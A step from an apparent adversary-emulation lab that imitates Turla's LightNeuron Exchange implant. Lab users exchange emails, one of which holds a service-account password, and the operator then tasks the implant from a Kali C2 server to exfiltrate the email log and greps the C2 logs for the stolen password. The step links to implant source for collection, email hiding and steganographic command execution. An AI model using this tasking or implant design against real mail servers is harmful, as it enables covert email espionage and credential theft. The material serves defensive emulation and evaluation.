* :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`. 
 
* Go to your Edge browser window with the OWA page. If you do not have an Edge
browser with OWA open from a previous step, open Edge then navigate to 
`https://drebule.nk.local/owa` and log in as `Zilvinas`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Zilvinas  | Producer2! |

* Create a new email:
 * The email recipient should be the user `egle@nk.local`
 * The email subject should be `SAP Integration Issue`
 * The following text should be pasted in as the email body:
   ```
   Hi Egle,
   After our meeting earlier I spoke with Tenko about the SAP integration issue that was preventing the users from logging in. I did a little digging and noticed there is an authentication error on the SAP server.

   When you get a few minutes could you check to make sure the service account is still active and the credentials have not expired? The account name is SVC_SAP2.
   ```

* Send the email

:arrow_right: Switch to your RDP window to `Azuolas (10.100.40.103)` as `Egle`. 

* Go to your Edge browser window. You should still be logged into OWA from earlier.

* You should see the email from `Zilvinas@nk.local`. Try reloading the page if needed.

* Reply to the email from Zilvinas.
 * The following text should be pasted in as the email reply body:
   ```
   Zilvinas,

   I just checked on the service account. It appears that the account was still active, but the password had expired. I've adjusted the settings for the account, so the password should not expire again.

   The new password is: dfsbH%T5RWf3bwq3aeGR$3%
   
   Let me know if this fixes the authentication issue.
   ```

* Send the email

:arrow_right: Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:
```bash
./evalsC2client.py --set-task info@nk.local '3 | 0'
```

* The file contents will be logged by the control server.
:heavy_exclamation_mark: Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:
```bash
grep 'dfsbH%T5RWf3bwq3aeGR$3%' /opt/day2/turla/Resources/control_server/logs.txt
```

---

### :moyai: Source Code

* [Installation Script](../../Resources/LightNeuron/msiex.ps1)
* [LightNeuron](../../Resources/LightNeuron/)
  * [Masquerading legitimate file name](../../Resources/LightNeuron/CompanionDLL/data/winmail.dat)
* [Transport Agent](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs)
  * [Remote Email Collection](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L56)
  * [Automated Collection](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L100)
  * [Email Hiding Rules](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L162)
* [Companion DLL](../../Resources/LightNeuron/CompanionDLL/)
  * [Check message against rule file](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L307)
  * [Data Staging/Automated Collection](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L196)
  * [Analyze attachment for data from C2](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L98)
  * [Send message back to C2 server over email](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L130)
* [Steganography](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp)
  * [Decode attachment data from base64](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L437)
  * [Check signature in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L136)
  * [Decrypt data in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L99)
  * [Extract task from image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L302)
  * [Execute commands: Cmd ID 3](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L232)
  * [Execute commands: Cmd ID 5](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L263)
  * [Encrypt result of command in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L51)
  * [Hide result of command in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L184)
  * [Encode data in base64](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L499)

### :microscope: Cited Intelligence

* <https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf>
